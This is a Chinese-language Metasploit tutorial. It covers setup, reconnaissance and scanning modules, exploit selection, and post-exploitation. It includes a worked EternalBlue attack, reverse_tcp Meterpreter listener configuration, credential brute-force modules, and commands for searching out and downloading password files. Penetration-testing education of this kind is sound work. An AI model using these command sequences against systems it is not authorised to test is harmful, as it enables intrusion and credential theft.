# Metasploit Framework (MSF) 使用指南

# 0、MSF简介
Metasploit [Framework](https://so.csdn.net/so/search?q=Framework&spm=1001.2101.3001.7020)（MSF）是一个开源的渗透测试框架，它是渗透测试领域的核心工具之一，被广泛应用于安全研究和渗透测试。MSF通过模块化设计，简化了漏洞利用和后渗透操作，帮助测试人员快速验证系统安全性。
![](https://minioapi.nerubian.cn/image/20250415154338078.png)
# 1、准备阶段

## 1.1、基础概念

### 模块的概念
Metasploit 基于[模块](https://docs.metasploit.com/docs/modules.html)的概念。最常用的模块类型是：

- ==Auxiliary== - 辅助模块不利用目标，但可以执行数据收集或管理任务
- ==Exploit== - 利用漏洞模块以允许框架在目标主机上执行任意代码的方式利用漏洞
- ==Payloads== - Payload生成模块可以在远程目标上执行的任意代码，用于执行任务，例如创建用户、打开 shell 等
- ==Post== - 后渗透模块在计算机被入侵后使用。它们执行有用的任务，例如收集、汇总或枚举会话中的数据。

### 模块的简单使用

- `search <keyword>`：搜索模块，例如`search ms17-010`
- `use <module>`：选择模块，例如`use exploit/windows/smb/ms17_010_eternalblue`
- `info`：显示模块的使用方法和参数
- `show options`：查看模块配置项。
- `set <option> <value>`：设置参数，例如`set RHOST 192.168.1.100`
- `exploit` 或 `run`：执行模块
- `sessions`：查看和管理会话


### 模块的存储路径

```bash
ll /usr/share/metasploit-framework/modules

drwxr-xr-x 22 root root 4096 Apr 10 02:24 auxiliary
drwxr-xr-x 12 root root 4096 Nov 30 07:24 encoders
drwxr-xr-x  3 root root 4096 Nov 30 07:24 evasion
drwxr-xr-x 22 root root 4096 Apr 10 02:24 exploits
drwxr-xr-x 14 root root 4096 Dec 26 02:00 nops
drwxr-xr-x  6 root root 4096 Nov 30 07:24 payloads
drwxr-xr-x 14 root root 4096 Nov 30 07:24 post
-rw-r--r--  1 root root  434 Mar 19 13:38 README.md
```

## 1.2、MSF安装和更新
### 安装MSF
(以Kali Linux为例)
```bash
apt update -y && apt install -y metasploit-framework
```
### 更新MSF版本
```bash
apt update -y && apt upgrade -y metasploit-framework
```
  或使用旧命令：  
```bash
msfupdate
```
### 更新MSF数据库
```bash
sudo msfdb init
```

## 1.5、命令帮助（v6.4.54-dev）

如需了解某个命令的更多信息，使用 `<命令> -h` 或 `help <命令>`。
### 核心命令  

| 命令       | 描述                  |
| -------- | ------------------- |
| ?        | 帮助菜单                |
| banner   | 展示一个很棒的metasploit横幅 |
| cd       | 更改当前工作目录            |
| color    | 切换颜色                |
| connect  | 与主机通信               |
| debug    | 显示调试有用的信息           |
| exit     | 退出控制台               |
| features | 显示尚未发布但可以选择使用的功能列表  |
| get      | 获取特定于上下文的变量的值       |
| getg     | 获取全局变量的值            |
| grep     | Grep另一个命令的输出        |
| help     | 帮助菜单                |
| history  | 显示命令历史              |
| load     | 加载框架插件              |
| quit     | 退出控制台               |
| repeat   | 重复命令列表              |
| route    | 通过会话路由流量            |
| save     | 保存激活的数据存储           |
| sessions | 转储会话列表并显示会话信息       |
| set      | 将上下文相关的变量设置为一个值     |
| setg     | 设置一个全局变量的值          |
| sleep    | 在指定的秒数内什么都不做        |
| spool    | 将控制台输出写入文件以及屏幕      |
| threads  | 查看和操作后台线程           |
| tips     | 展示一些有用的提高生产力的技巧     |
| unload   | 卸载框架插件              |
| unset    | 取消设置一个或多个特定于上下文的变量  |
| unsetg   | 取消设置一个或多个全局变量       |
| version  | 显示框架和控制台库的版本号       |

### 模块操作命令

| 命令         | 描述                               |
| ---------- | -------------------------------- |
| advanced   | 显示一个或多个模块的高级选项                   |
| back       | 从当前上下文中后退                        |
| clearm     | 清除模块栈                            |
| favorite   | 将模块添加到喜欢的模块列表中                   |
| favorites  | 打印喜爱的模块列表（‘ show favorites ’的别名） |
| info       | 显示一个或多个模块的信息                     |
| listm      | 列出模块栈                            |
| loadpath   | 从路径中搜索和加载模块                      |
| options    | 显示一个或多个模块的全局选项                   |
| popm       | 将最新的模块从栈中弹出并激活                   |
| previous   | 将先前加载的模块设置为当前模块                  |
| pushm      | 将活动模块或模块列表压入模块栈                  |
| reload_all | 从所有定义的模块路径中重新加载所有模块              |
| search     | 搜索模块名称和描述                        |
| show       | 显示给定类型的模块或所有模块                   |
| use        | 通过名称或搜索词/索引与模块交互                 |

### 工作命令

| 命令         | 描述             |
| ---------- | -------------- |
| handler    | 启动一个负载处理程序作为任务 |
| jobs       | 显示和管理作业        |
| kill       | 终止作业           |
| rename_job | 重命名作业          |

### 资源脚本命令

| 命令       | 描述              |
| -------- | --------------- |
| makerc   | 将开始后输入的命令保存到文件中 |
| resource | 运行存储在文件中的命令     |
### 数据库后端命令
| 命令               | 描述                          |
| ---------------- | --------------------------- |
| analyze          | 分析特定地址或地址范围的数据库信息           |
| db_connect       | 连接到现有的数据服务                  |
| db_disconnect    | 断开与当前数据服务的连接                |
| db_export        | 导出一个包含数据库内容的文件              |
| db_import        | 导入扫描结果文件（文件类型将自动检测）         |
| db_nmap          | 执行nmap并自动记录输出               |
| db_rebuild_cache | 重建数据库存储的模块缓存（已弃用）           |
| db_remove        | 删除保存的数据服务条目                 |
| db_save          | 将当前数据服务连接保存为默认连接，以便在启动时重新连接 |
| db_stats         | 显示数据库的统计信息                  |
| db_status        | 显示当前数据服务状态                  |
| hosts            | 列出数据库中的所有主机                 |
| klist            | 在数据库中列出Kerberos票证           |
| loot             | 列出数据库中的所有战利品                |
| notes            | 列出数据库中的所有笔记                 |
| services         | 列出数据库中的所有服务                 |
| vulns            | 列出数据库中的所有漏洞                 |
| workspace        | 在数据库工作区之间切换                 |
### 证书后端命令

| 命令    | 描述          |
| ----- | ----------- |
| creds | 列出数据库中的所有凭据 |

### 开发人员的命令

| 命令         | 描述                      |
| ---------- | ----------------------- |
| edit       | 用首选编辑器编辑当前模块或文件         |
| irb        | 在当前上下文中打开交互式Ruby shell  |
| log        | 如果可能，将frame .log分页显示到最后 |
| pry        | 打开当前模块或框架上的Pry调试器       |
| reload_lib | 从指定路径重新加载Ruby库文件        |
| time       | Time运行特定命令所需的时间         |
### DNS 命令

| 命令  | 描述                   |
| --- | -------------------- |
| dns | 管理Metasploit的DNS解析行为 |

### 辅助命令

| 命令       | 描述                |
| -------- | ----------------- |
| check    | 检查目标是否易受攻击        |
| exploit  | 这是run命令的别名        |
| rcheck   | 重新加载模块并检查目标是否存在漏洞 |
| recheck  | 这是rcheck命令的别名     |
| reload   | 重新加载辅助模块          |
| rerun    | 重新加载并启动辅助模块       |
| rexploit | 这是rerun命令的别名      |
| run      | 启动辅助模块。           |

## 1.5、其他工具准备
- 必备工具：Nmap、MSF、Burp Suite、Exploit-DB、CVE查询数据库
- 脚本工具：`linpeas.sh`
- 配置监听：事先选定IP、端口，例如反弹Shell的监听配置：
```bash
  use exploit/multi/handler
  set PAYLOAD windows/meterpreter/reverse_tcp
  set LHOST <你的IP>
  set LPORT <端口号>
```


# 2、渗透测试完整流程

## 1、准备阶段

### 1.1、启动MSFDB

在Metasploit（MSF）中，数据库（默认使用PostgreSQL）用于存储扫描结果、漏洞信息、会话数据等，便于后续分析和操作。

```bash
┌──(kali㉿kali)-[~]
└─$ msfdb init
[-] Error: /usr/bin/msfdb must be run as root

┌──(kali㉿kali)-[~]
└─$ sudo su -       
[sudo] password for kali: 
┌──(root㉿kali)-[~]
└─# msfdb init
[i] Database already started
[i] The database appears to be already configured, skipping initialization

┌──(root㉿kali)-[~]
└─# msfdb stop
[+] Stopping database

┌──(root㉿kali)-[~]
└─# msfdb delete
[+] Starting database
[+] Dropping databases 'msf'
[+] Dropping databases 'msf_test'
[+] Dropping database user 'msf'
[+] Deleting configuration file /usr/share/metasploit-framework/config/database.yml
[+] Stopping database

┌──(root㉿kali)-[~]
└─# exit

┌──(kali㉿kali)-[~]
└─$ sudo msfdb init
[+] Starting database
[+] Creating database user 'msf'
[+] Creating databases 'msf'
[+] Creating databases 'msf_test'
[+] Creating configuration file '/usr/share/metasploit-framework/config/database.yml'
[+] Creating initial database schema

┌──(kali㉿kali)-[~]
└─$ sudo msfdb start
[i] Database already started
```

| 作用             | shell命令        |
| -------------- | -------------- |
| 初始化数据库（首次使用必做） | `msfdb init`   |
| 启动数据库服务        | `msfdb start`  |
| 停止数据库服务        | `msfdb stop`   |
| 重置数据库服务        | `msfdb reinit` |
| 检查数据库服务状态      | `msfdb status` |
| 删除数据库服务        | `msfdb delete` |
| 显示帮助信息         | `msfdb help`   |

进入MSF控制台后（`msfconsole`），使用以下命令管理数据库：

| 作用                     | 命令                                                              |
| ---------------------- | --------------------------------------------------------------- |
| 连接到数据库             | `db_connect [用户名:密码@主机:端口/数据库名]`                                |
| 默认连接（首次初始化后无需手动执行） | `db_connect msf:msf@127.0.0.1:5432/msf`                         |
| 断开数据库连接            | `db_disconnect`                                                 |
| 查看数据库连接状态          | `db_status`                                                     |
| 列出所有存储的主机信息            | `hosts`                                                         |
| 列出所有存储的主机信息（自定义显示列）    | `hosts -c name,ip,os`                                           |
| 删除指定主机记录               | `hosts -d <IP>`                                                 |
| 列出所有存储的漏洞信息            | `vulns`                                                         |
| 列出所有存储的会话（Session） | `sessions`                                                      |
| 导入外部扫描数据               | `db_import <文件路径>`                                              |
| 导入Nmap扫描结果到数据库         | `db_import /root/nmap_scan.xml`                                 |
| 导出数据库数据                | `db_export -f <格式> <文件路径>`                                      |
| 导出主机列表为CSV文件           | `db_export -f csv /root/hosts.csv`                              |
| 清空当前数据库中的所有数据          | `db_flush`                                                      |
| 使用数据库增强扫描模块            | 在使用扫描模块（如`auxiliary/scanner/portscan/tcp`）时，添加`-j`参数可自动将结果存入数据库 |


**使用数据库增强扫描模块**
   - 在使用扫描模块（如`auxiliary/scanner/portscan/tcp`）时，添加`-j`参数可自动将结果存入数据库：  
     ```ruby
     use auxiliary/scanner/portscan/tcp
     set RHOSTS 192.168.1.1-254
     set THREADS 50
     run -j  # 结果存入数据库
     ```


### 1.1、启动MSF控制台
启动需要一点时间

```bash
┌──(kali㉿kali)-[~]
└─$ sudo msfconsole 
Metasploit tip: To save all commands executed since start up to a file, use the 
makerc command
                                                  

      .:okOOOkdc'           'cdkOOOko:.
    .xOOOOOOOOOOOOc       cOOOOOOOOOOOOx.
   :OOOOOOOOOOOOOOOk,   ,kOOOOOOOOOOOOOOO:
  'OOOOOOOOOkkkkOOOOO: :OOOOOOOOOOOOOOOOOO'
  oOOOOOOOO.MMMM.oOOOOoOOOOl.MMMM,OOOOOOOOo
  dOOOOOOOO.MMMMMM.cOOOOOc.MMMMMM,OOOOOOOOx
  lOOOOOOOO.MMMMMMMMM;d;MMMMMMMMM,OOOOOOOOl
  .OOOOOOOO.MMM.;MMMMMMMMMMM;MMMM,OOOOOOOO.
   cOOOOOOO.MMM.OOc.MMMMM'oOO.MMM,OOOOOOOc
    oOOOOOO.MMM.OOOO.MMM:OOOO.MMM,OOOOOOo
     lOOOOO.MMM.OOOO.MMM:OOOO.MMM,OOOOOl
      ;OOOO'MMM.OOOO.MMM:OOOO.MMM;OOOO;
       .dOOo'WM.OOOOocccxOOOO.MX'xOOd.
         ,kOl'M.OOOOOOOOOOOOO.M'dOk,
           :kk;.OOOOOOOOOOOOO.;Ok:
             ;kOOOOOOOOOOOOOOOk:
               ,xOOOOOOOOOOOx,
                 .lOOOOOOOl.
                    ,dOd,
                      .

       =[ metasploit v6.4.54-dev                          ]
+ -- --=[ 2500 exploits - 1289 auxiliary - 431 post       ]
+ -- --=[ 1610 payloads - 49 encoders - 13 nops           ]
+ -- --=[ 9 evasion                                       ]

Metasploit Documentation: https://docs.metasploit.com/

msf6 >
```
### 1.3、设置工作区 (workspace)

- 设置工作区,创建单独的工作区便于记录和管理： 

| 作用          | 命令                                |
| ----------- | --------------------------------- |
| 列出所有工作区     | `workspace -l`                    |
| 切换到指定工作区    | `workspace <工作区名称>`               |
| 新建工作区       | `workspace -a <工作区名称>`            |
| 删除工作区       | `workspace -d <工作区名称>`            |
| 重命名工作区      | `workspace -r <当前工作区名称> <新工作区名称>` |
| 显示当前工作区     | `workspace`                       |
| 清理当前工作区中的数据 | `workspace -c`                    |
### 进程调整命令
更多请查看 1.5 -> 工作命令
```
msf5 auxiliary(sniffer/psnuffle) > jobs		    #查看msf后台运行进程
msf5 auxiliary(sniffer/psnuffle) > jobs -K		#杀死进程
```
## 2、信息收集
### 2.1、被动信息收集模块

| 模块名称            | 模块路径                                       |
| --------------- | ------------------------------------------ |
| 网络流量嗅探          | `auxiliary/sniffer/psnuffle`               |
| SSL 漏洞被动检测      | `auxiliary/scanner/ssl/openssl_heartbleed` |
| DNS 信息被动收集      | `auxiliary/gather/dns_info`                |
| ARP 流量嗅探        | `auxiliary/sniffer/arp_sniffer`            |
| 用于DHCP流量分析      | `auxiliary/sniffer/dhcp_sniffer`           |
| FTP Banner信息收集  | `auxiliary/scanner/ftp/ftp_version`        |
| SSH Banner信息收集  | `auxiliary/scanner/ssh/ssh_version`        |
| Telnet Banner收集 | `auxiliary/scanner/telnet/telnet_version`  |

### 2.2、主动信息收集模块

#### 主机发现模块

```ruby
msf6 > search arp_sweep

Matching Modules
================

   #  Name                                   Disclosure Date  Rank    Check  Description
   -  ----                                   ---------------  ----    -----  -----------
   0  auxiliary/scanner/discovery/arp_sweep  .                normal  No     ARP Sweep Local Network Discovery


Interact with a module by name or index. For example info 0, use 0 or use auxiliary/scanner/discovery/arp_sweep

msf6 > use 0
msf6 auxiliary(scanner/discovery/arp_sweep) > info

       Name: ARP Sweep Local Network Discovery
     Module: auxiliary/scanner/discovery/arp_sweep
    License: Metasploit Framework License (BSD)
       Rank: Normal

Provided by:
  belch

Check supported:
  No

Basic options:
  Name       Current Setting  Required  Description
  ----       ---------------  --------  -----------
  INTERFACE                   no        The name of the interface
  RHOSTS                      yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-me
                                        tasploit.html
  SHOST                       no        Source IP Address
  SMAC                        no        Source MAC Address
  THREADS    1                yes       The number of concurrent threads (max one per host)
  TIMEOUT    5                yes       The number of seconds to wait for new data

Description:
  Enumerate alive Hosts in local network using ARP requests.


View the full module info with the info -d command.

msf6 auxiliary(scanner/discovery/arp_sweep) > options 

Module options (auxiliary/scanner/discovery/arp_sweep):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   INTERFACE                   no        The name of the interface
   RHOSTS                      yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-m
                                         etasploit.html
   SHOST                       no        Source IP Address
   SMAC                        no        Source MAC Address
   THREADS    1                yes       The number of concurrent threads (max one per host)
   TIMEOUT    5                yes       The number of seconds to wait for new data


View the full module info with the info, or info -d command.

msf6 auxiliary(scanner/discovery/arp_sweep) > set RHOSTS 192.168.56.0/24
RHOSTS => 192.168.56.0/24
msf6 auxiliary(scanner/discovery/arp_sweep) > set INTERFACE eth1
INTERFACE => eth1
msf6 auxiliary(scanner/discovery/arp_sweep) > run
/usr/share/metasploit-framework/lib/msf/core/exploit/capture.rb:123: warning: undefining the allocator of T_DATA class PCAPRUB::Pcap
[+] 192.168.56.1 appears to be up (UNKNOWN).
[+] 192.168.56.100 appears to be up (CADMUS COMPUTER SYSTEMS).
[+] 192.168.56.105 appears to be up (CADMUS COMPUTER SYSTEMS).
[*] Scanned 256 of 256 hosts (100% complete)
[*] Auxiliary module execution completed
msf6 auxiliary(scanner/discovery/arp_sweep) > 
```
##### 1. 通用主机发现模块 

| 模块名称                   | 模块路径                                        |
| ---------------------- | ------------------------------------------- |
| Ping 扫描模块              | `auxiliary/scanner/discovery/icmp_ping`     |
| TCP 扫描模块               | `auxiliary/scanner/discovery/tcp_ping`      |
| ARP 扫描模块               | `auxiliary/scanner/discovery/arp_sweep`     |
| 主机发现模块（使用 UDP）         | `auxiliary/scanner/discovery/udp_probe`     |
| SNMP Discovery（SNMP嗅探） | `auxiliary/scanner/snmp/snmp_enum`          |
| NetBIOS 扫描模块           | `auxiliary/scanner/smb/smb_lookups`         |
| IP 地址范围探测模块            | `auxiliary/scanner/discovery/ipv6_neighbor` |
| UPnP Discovery 模块      | `auxiliary/scanner/upnp/ssdp_msearch`       |

##### 2. Windows 主机发现模块

| 模块名称                    | 模块路径                                       |
| ----------------------- | ------------------------------------------ |
| NetBIOS 本地网络发现模块     | `auxiliary/scanner/smb/smb_enumshares`      |
| SMB 扫描模块                | `auxiliary/scanner/smb/smb_version`         |
| MSRPC 服务探测模块          | `auxiliary/scanner/dcerpc/endpoint_mapper`  |

##### 3. Linux 主机发现模块

| 模块名称                    | 模块路径                                       |
| ----------------------- | ------------------------------------------ |
| SSH 服务探测模块            | `auxiliary/scanner/ssh/ssh_version`         |
| Linux NFS 探查模块          | `auxiliary/scanner/nfs/nfs_mount`           |

##### 4. 特定网络服务模块

| 模块名称                    | 模块路径                                       |
| ----------------------- | ------------------------------------------ |
| DNS 名称解析模块            | `auxiliary/scanner/dns/dns_query`           |
| HTTP 服务探测模块           | `auxiliary/scanner/http/http_version`       |
| FTP 服务探测模块            | `auxiliary/scanner/ftp/ftp_version`         |
| Telnet 服务探测模块         | `auxiliary/scanner/telnet/telnet_version`   |

##### 5. IoT设备相关模块

| 模块名称                    | 模块路径                                       |
| ----------------------- | ------------------------------------------ |
| UPnP设备发现模块            | `auxiliary/scanner/upnp/ssdp_msearch`       |
| Modbus 工业设备发现模块     | `auxiliary/scanner/scada/modbusdetect`      |


### 端口扫描模块

#### **调用 Nmap 扫描**

可以直接在 Metasploit 控制台中用 `db_nmap` 命令调用 Nmap，结果会自动存入 MSF 的数据库

```ruby
db_nmap -sS -sV -T4 -Pn 192.168.56.105
```

- `db_nmap` 是 Metasploit 封装的 Nmap 调用命令，允许将扫描结果直接导入 MSF 数据库。
- 选项与参数与 Nmap 相同

```ruby
msf6 auxiliary(scanner/http/http_version) > db_nmap -sS -sV -T4 -Pn 192.168.56.105
[*] Nmap: Starting Nmap 7.95 ( https://nmap.org ) at 2025-04-15 02:58 EDT
[*] Nmap: Nmap scan report for 192.168.56.105
[*] Nmap: Host is up (0.00087s latency).
[*] Nmap: Not shown: 994 closed tcp ports (reset)
[*] Nmap: PORT     STATE SERVICE  VERSION
[*] Nmap: 22/tcp   open  ssh      OpenSSH 7.4 (protocol 2.0)
[*] Nmap: 80/tcp   open  http     Apache httpd 2.4.6 ((CentOS) OpenSSL/1.0.2k-fips mod_fcgid/2.3.9 PHP/5.4.16 mod_perl/2.0.11 Perl/v5.16.3)
[*] Nmap: 111/tcp  open  rpcbind  2-4 (RPC #100000)
[*] Nmap: 443/tcp  open  ssl/http Apache httpd 2.4.6 ((CentOS) OpenSSL/1.0.2k-fips mod_fcgid/2.3.9 PHP/5.4.16 mod_perl/2.0.11 Perl/v5.16.3)
[*] Nmap: 3306/tcp open  mysql    MariaDB 10.3.23 or earlier (unauthorized)
[*] Nmap: 8086/tcp open  http     InfluxDB http admin 1.7.9
[*] Nmap: MAC Address: 08:00:27:A4:07:39 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
[*] Nmap: Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
[*] Nmap: Nmap done: 1 IP address (1 host up) scanned in 14.85 seconds

```

| 模块名称        | 模块路径                                        |
| ----------- | ------------------------------------------- |
| TCP 端口扫描    | `auxiliary/scanner/portscan/tcp`            |
| SYN 半开扫描    | `auxiliary/scanner/portscan/syn`            |
| UDP 端口扫描    | `auxiliary/scanner/discovery/udp_probe`     |
| IPv6 主机扫描   | `auxiliary/scanner/discovery/ipv6_neighbor` |
| Telnet 端口探测 | `auxiliary/scanner/telnet/telnet_version`   |
| UPnP 端口探测   | `auxiliary/scanner/upnp/upnp_root`          |

#### 服务扫描模块

| 模块名称                 | 模块路径                                |
| --------------------- | --------------------------------------- |
| DNS服务扫描 | auxiliary/scanner/dns/dns_enum                     |
| FTP服务扫描 | auxiliary/scanner/ftp/ftp_version                  |
| HTTPSSSL/TLS信息扫描 | auxiliary/scanner/http/ssl                |
| HTTP服务扫描 | auxiliary/scanner/http/http_version               |
| IMAP服务扫描 | auxiliary/scanner/imap/imap_version               |
| LDAP服务扫描 | auxiliary/scanner/ldap/ldap_enum                  |
| MSSQL端口探测 | auxiliary/scanner/mssql/mssql_version            |
| MySQL服务扫描 | auxiliary/scanner/mysql/mysql_version            |
| NTP端口探测 | auxiliary/scanner/ntp/ntp_server                   |
| Oracle服务端口检测 | auxiliary/scanner/oracle/oracle_version      |
| POP3服务扫描 | auxiliary/scanner/pop3/pop3_version               |
| PostgreSQL服务扫描 | auxiliary/scanner/postgres/postgres_version |
| RDP服务扫描 | auxiliary/scanner/rdp/rdp_scanner                  |
| Redis端口探测 | auxiliary/scanner/redis/redis_server             |
| Redis信息探测 | auxiliary/scanner/redis/redis_login              |
| SIP服务扫描 | auxiliary/scanner/sip/options                      |
| SMB服务扫描 | auxiliary/scanner/smb/smb_version                  |
| SMB共享枚举扫描 | auxiliary/scanner/smb/smb_enumshares            |
| SMB用户枚举扫描 | auxiliary/scanner/smb/smb_enumusers             |
| SMTP服务扫描 | auxiliary/scanner/smtp/smtp_enum                  |
| SNMP枚举扫描 | auxiliary/scanner/snmp/snmp_enum                  |
| SSH服务扫描 | auxiliary/scanner/ssh/ssh_version                  |
| SYN扫描 | auxiliary/scanner/portscan/syn                        |
| TCP端口扫描 | auxiliary/scanner/portscan/tcp                     |
| Telnet服务扫描 | auxiliary/scanner/telnet/telnet_version         |
| TFTP服务扫描 | auxiliary/scanner/tftp/tftp_enum                  |
| UDP端口扫描 | auxiliary/scanner/discovery/udp_sweep              |
| VNC端口探测 | auxiliary/scanner/vnc/vnc_tcp                      |
| VNC服务扫描 | auxiliary/scanner/vnc/vnc_login                    |


 #### WEB服务模块：

| 模块名称                   | 模块路径                                           |
| ---------------------- | ---------------------------------------------- |
| HTTP 服务版本探测            | `auxiliary/scanner/http/http_version`          |
| HTTPS SSL/TLS 信息探测     | `auxiliary/scanner/http/ssl`                   |
| HTTP 内容识别探测            | `auxiliary/scanner/http/http_identify`         |
| HTTP 凭证爆破              | `auxiliary/scanner/http/http_login`            |
| HTTP URL 路径枚举          | `auxiliary/scanner/http/dir_listing`           |
| HTTP 配置文件枚举            | `auxiliary/scanner/http/config_scanner`        |
| HTTP SQL 注入扫描          | `auxiliary/scanner/http/sql_injection`         |
| HTTP 参数枚举扫描            | `auxiliary/scanner/http/parameter_brute`       |
| HTTP 配置文件泄露探测          | `auxiliary/scanner/http/robots_txt`            |
| WordPress 登录探测         | `auxiliary/scanner/http/wordpress_login`       |
| Joomla 登录探测            | `auxiliary/scanner/http/joomla_login`          |
| Drupal 登录探测            | `auxiliary/scanner/http/drupal_login`          |
| Tomcat 管理接口探测          | `auxiliary/scanner/http/tomcat_mgr_login`      |
| Jenkins 登录探测           | `auxiliary/scanner/http/jenkins_login`         |
| HTTP 弱点检测探测            | `auxiliary/scanner/http/http_weakness`         |
| Apache 服务探测            | `auxiliary/scanner/http/apache_version`        |
| Nginx 服务探测             | `auxiliary/scanner/http/nginx_version`         |
| IIS 服务探测               | `auxiliary/scanner/http/iis_version`           |
| PHPMyAdmin 探测          | `auxiliary/scanner/http/phpmyadmin_login`      |
| HTTP 默认证书枚举            | `auxiliary/scanner/http/http_ssl`              |
| WebDAV 扫描与探测           | `auxiliary/scanner/http/webdav_scanner`        |
| HTTP 配置文件枚举            | `auxiliary/scanner/http/http_config`           |
| URL 探测与文件枚举            | `auxiliary/scanner/http/http_enum`             |
| WordPress 用插件信息枚举      | `auxiliary/scanner/http/wordpress_enum`        |
| Joomla 信息枚举            | `auxiliary/scanner/http/joomla_plugin_scanner` |
| CGI 扫描与敏感目录探测          | `auxiliary/scanner/http/cgibin_scanner`        |
| Apache 服务器版本检测         | `auxiliary/scanner/http/apache_server_version` |
| 扫描 HTTP 参数泄露 (Headers) | `auxiliary/scanner/http/http_header`           |


#### 网络协议模块

| 模块名称                | 模块路径                                       |
| -------------------- | ------------------------------------------ |
| NETBIOS 名称探测      | `auxiliary/scanner/netbios/nbname`         |
| 网络共有资源枚举      | `auxiliary/scanner/smb/smb_enumshares`     |
| SMB 用户信息探测      | `auxiliary/scanner/smb/smb_enumusers`      |
| DNS 命名解析枚举      | `auxiliary/scanner/dns/dns_enum`           |
| 网络设备探测          | `auxiliary/scanner/snmp/snmp_enum`         |
| NTP 服务器时间探测    | `auxiliary/scanner/ntp/ntp_version`        |
| UPnP 设备探测         | `auxiliary/scanner/upnp/ssdp_msearch`      |

#### 数据库模块

| 模块名称                      | 模块路径                                       |
| ------------------------- | ------------------------------------------ |
| MySQL 用户名爆破           | `auxiliary/scanner/mysql/mysql_login`      |
| MSSQL 用户名探测与枚举     | `auxiliary/scanner/mssql/mssql_enum`       |
| PostgreSQL 探测与枚举      | `auxiliary/scanner/postgres/postgres_login` |
| Redis 登录口令爆破         | `auxiliary/scanner/redis/redis_login`      |
| Oracle 数据库信息枚举      | `auxiliary/scanner/oracle/oracle_login`    |


#### Wi-Fi信息模块

| 模块名称                            | 模块路径                                       |
| ------------------------------- | ------------------------------------------ |
| Wi-Fi 网络 SSID 扫描              | `auxiliary/scanner/wifi/wifi_probe`        |
| 无线设备信息探测                  | `auxiliary/scanner/wifi/packet_capture`    |
| 蓝牙设备探测                     | `auxiliary/scanner/bluetooth/scan`         |


## 3、漏洞利用
通过信息收集阶段发现的潜在入口点，选择合适的Exploit模块并执行漏洞利用。

### 信息记录
将扫描结果保存以便后续模块选择：
```bash
notes add <笔记内容>
```

### 3.1、漏洞利用搜索

- 搜索漏洞模块：  
```bash
  search ms17-010
```

- 使用模块：  
```bash
  use exploit/windows/smb/ms17_010_eternalblue
```

#### 常见漏洞POC列表：

| 模块名称                         | 模块路径                                                |
| ---------------------------- | --------------------------------------------------- |
| MS17-010 EternalBlue 漏洞利用    | `exploit/windows/smb/ms17_010_eternalblue`          |
| Tomcat 管理接口漏洞利用              | `exploit/multi/http/tomcat_mgr_upload`              |
| Java RMI 反序列化漏洞利用            | `exploit/multi/misc/java_rmi_server`                |
| Android Meterpreter APK 注入   | `exploit/android/fileformat/adobe_pdf_embedded_exe` |
| Jenkins 远程代码执行漏洞             | `exploit/multi/http/jenkins_script_console`         |
| Apache Struts 远程代码执行         | `exploit/multi/http/struts2_content_type_ognl`      |
| Joomla Core SQL 注入漏洞         | `exploit/multi/http/joomla_versioned_objects_rce`   |
| Drupalgeddon 远程代码执行          | `exploit/multi/http/drupal_drupalgeddon2`           |
| Wordpress 插件远程代码执行           | `exploit/multi/http/wp_admin_shell_upload`          |
| Samba CVE-2017-7494 漏洞利用     | `exploit/linux/samba/is_known_pipename`             |
| VSFTPD 后门漏洞利用                | `exploit/unix/ftp/vsftpd_234_backdoor`              |
| Proftpd ModCopy 漏洞利用         | `exploit/unix/ftp/proftpd_modcopy_exec`             |
| WebLogic 远程代码执行漏洞            | `exploit/multi/http/weblogic_deserialize_unicast`   |
| Adobe ColdFusion 文件上传        | `exploit/multi/http/coldfusion_file_upload`         |
| Microsoft IE 内存崩溃利用          | `exploit/windows/browser/ms13_062_caret`            |
| RDP 蓝屏漏洞（CVE-2019-0708）      | `exploit/windows/rdp/cve_2019_0708_bluekeep_rce`    |
| SMBGhost 漏洞利用（CVE-2020-0796） | `exploit/windows/smb/smbghost_rce`                  |
| Apache ActiveMQ 反序列化漏洞       | `exploit/multi/misc/activemq_deserialization`       |
| Redis 未授权访问漏洞                | `exploit/linux/redis/redis_unauth_exec`             |
| Elasticsearch RCE 漏洞         | `exploit/multi/elasticsearch/script_mvel_rce`       |
| 脏牛Dirty Cow（CVE-2016-5195）   | `use exploit/linux/local/dirtycow`                  |

### 3.2、配置参数
使用`show options`查看目标模块的可配置参数：
- 设置目标IP：  
```bash
set RHOST 192.168.1.100
```
- 设置反弹Shell监听：
```bash
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST <你的IP>
set LPORT 4444
```
- 查看当前配置：
```bash
show options
```

### 3.3、执行漏洞利用
启动Exploit模块：
```bash
exploit
或
run
```

案例：
- 漏洞：MS17-010 (EternalBlue)  
1. 使用模块：  
```bash
use exploit/windows/smb/ms17_010_eternalblue
```
2. 配置目标：  
```bash
set RHOST 192.168.1.100
set PAYLOAD windows/x64/meterpreter/reverse_tcp
```
3. 执行攻击：  
```bash
exploit
```

### 3.4、验证会话
- 查看当前会话列表：  
```bash
  sessions -l
```
- 选择会话：
```bash
  sessions -i <会话ID>
```


## 4、后渗透
在获得目标访问权限后，进入Meterpreter，通过后渗透模块进一步提升权限、信息窃取、持续控制。

### 4.1、系统内信息收集
#### 0：使用 `shell` 命令切换到交互式 shell

Meterpreter 提供一种直接进入目标系统本地 Shell 的方式，运行以下命令即可：

```
shell
```

- 执行此命令后，你将进入目标系统的交互式 Bash Shell（如果目标是 Linux 系统）。

#### 1. 通用命令

• 查看系统信息：`sysinfo`
• 查看当前用户信息：`getuid`
• 查看环境变量：`getenv`
• 查看进程信息：`ps`
• 查看文件系统：
- `ls`：展示当前目录的文件
- `cd`：移动目录
-  `pwd`：当前目录
- `getwd`：本地工作目录
- `search -f *.txt -d c:\`：搜索文件。
	- 场景：查找并下载敏感文件。
	- `search -f *password*.txt -d c:\users`
-  `upload` / `download`：上传/下载文件。

##### Linux 系统内信息收集模块

| 模块名称           | 模块路径                               |
| -------------- | ---------------------------------- |
| 内核版本检测         | `uname -a`                         |
| 收集系统用户账户       | `post/linux/gather/enum_users`     |
| 获取主机名          | `post/linux/gather/hostname`       |
| 抓取网络配置信息       | `post/linux/gather/network_config` |
| 枚举系统环境变量       | `post/linux/gather/env`            |
| 枚举系统进程信息       | `post/linux/gather/processes`      |
| 获取可用命令列表       | `post/linux/gather/enum_commands`  |
| 枚举已安装软件包       | `post/linux/gather/enum_packages`  |
